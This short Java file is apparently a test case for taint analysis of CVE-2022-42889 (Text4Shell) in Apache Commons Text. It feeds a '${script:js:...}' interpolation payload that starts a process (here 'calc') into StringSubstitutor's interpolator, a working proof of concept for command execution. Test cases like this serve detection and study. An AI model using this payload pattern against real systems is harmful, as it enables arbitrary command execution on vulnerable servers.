import com.sun.jmx.snmp.internal.SnmpAccessControlModel;
import org.apache.commons.text.StringSubstitutor;
import org.apache.commons.text.TextStringBuilder;

import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.util.ServiceLoader;

// CVE-2022-42889
public class Server {
    public static void main(String[] args) {
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String input = getInput();
        interpolator.replace(input);
    }

    private static String getInput() {
        char[] chs = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}".toCharArray();
        chs[0] = taint();
        return new String(chs);
    }

    public static char taint(){
        return '$';
    }
}
